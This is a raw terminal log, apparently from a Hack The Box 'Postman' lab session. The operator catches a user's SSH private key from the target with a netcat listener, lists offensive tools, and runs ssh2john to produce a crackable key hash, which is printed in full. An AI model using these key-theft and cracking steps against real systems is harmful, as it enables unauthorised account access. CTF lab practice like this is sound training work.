root@parrot:~/hackthebox/postman# nc -nvlp 8000 > matt                           
Ncat: Version 7.80 ( https://nmap.org/ncat )                                     
Ncat: Listening on :::8000              
Ncat: bind to 0.0.0.0:8000: Address already in use. QUITTING.                    
root@parrot:~/hackthebox/postman# nc -nvlp 8005 > matt                                                                                                             
Ncat: Version 7.80 ( https://nmap.org/ncat )                                     
Ncat: Listening on :::8005              
Ncat: Listening on 0.0.0.0:8005         
Ncat: Connection from 10.10.10.160.     
Ncat: Connection from 10.10.10.160:49360.                                        
root@parrot:~/hackthebox/postman# ls    
foo.txt  matt  nmap  redis.py  ssh  ssh.pub  www                                 
root@parrot:~/hackthebox/postman# less mat                                       
mat: No such file or directory          
root@parrot:~/hackthebox/postman# less matt                                      
root@parrot:~/hackthebox/postman# cd /opt/                                       
root@parrot:/opt# ls                    
bbht                finger-user-enum     JAWS               privilege-escalation-awesome-scripts-suite  Sublist3r                  Veil                            
BloodHound          firmware-mod-kit     lazyrecon          PRTG-Network-Monitor-RCE                    Teeth                      wicd-git                        
BurpSuiteCommunity  fsociety             linux_privsec      pspy                                        tmux                       wordlists                       
car-hacking         ghidra               mRemoteNG-Decrypt  PyRFC                                       tmux-logging               XposedOrNot                     
ctf-tools           ghidra_9.1.1_PUBLIC  nishang            python3-pwntools                            tmux-yank                  Yuki-Chan-The-Auto-Pentest      
dirsearch           gobuster             passwords          RFCpwn                                      truffleHog                                                 
dsync               google               php-reverse-shell  SecLists                                    Ultimate-Facebook-Scraper                                  
Empire              impacket             PowerSploit        ssh2john.py                                 unicorn                                                    
root@parrot:/opt# python ssh2john.py ~/hackthebox/postman/matt ~/hackthebox/postman/matt.john                                                                      
/root/hackthebox/postman/matt:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f132be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29bcafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfce0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df310ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d39022507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216aec90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d080aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63                                      
[Errno 2] No such file or directory: '/root/hackthebox/postman/matt.john'        
root@parrot:/opt# cd -                  
/root/hackthebox/postman                
root@parrot:~/hackthebox/postman# ls    
foo.txt  matt  nmap  redis.py  ssh  ssh.pub  www                                 
root@parrot:~/hackthebox/postman# python ssh2john.py ~/hackthebox/postman/matt ~/hackthebox/postman/matt.john                                                      
python: can't open file 'ssh2john.py': [Errno 2] No such file or directory       
root@parrot:~/hackthebox/postman# cd /opt/                                       
root@parrot:/opt# python ssh2john.py ~/hackthebox/postman/matt ~/hackthebox/postman/matt.john                                                                      
/root/hackthebox/postman/matt:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f132be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29bcafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfce0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df310ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d39022507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216aec90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d080aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63                                      
[/root/hackthebox/postman/matt.john] couldn't parse keyfile                      
root@parrot:/opt#                       
